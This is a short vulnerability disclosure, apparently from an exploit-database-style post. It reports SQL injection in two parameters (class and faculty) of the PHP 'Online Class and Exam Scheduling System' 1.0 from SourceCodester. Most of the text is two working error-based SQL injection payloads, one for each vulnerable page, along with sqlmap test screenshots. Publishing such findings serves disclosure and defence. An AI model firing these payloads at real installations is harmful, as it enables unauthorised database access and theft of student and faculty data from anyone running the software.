# Online Class and Exam Scheduling System-SQL injections

### Date: 2022-08/07



### Exploit Author: anx0ing@gmail.com



### Vendor Homepage: 

[https://www.sourcecodester.com](https://www.sourcecodester.com/)



### Software Link: 

https://www.sourcecodester.com/php/11353/online-class-and-exam-scheduling-system.html



### Version: 1.0



### /pages/class_sched.php

> `class`Parameters have SQL injection

**payload**

```
class='||(SELECT 0x684d6b6c WHERE 5993=5993 AND (SELECT 2096 FROM(SELECT COUNT(*),CONCAT(0x717a786b71,(SELECT (ELT(2096=2096,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&search=
```

**SQLMAP Test**

![image-20220807222139658](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220807222139658.png)





### /pages/faculty_sched.php

> `faculty`Parameters have SQL injection

**payload**

```
faculty=' OR (SELECT 2078 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT (ELT(2078=2078,1))),0x717a706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uYCM&search=
```

**SQLMAP Test**

![image-20220807224208417](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220807224208417.png)

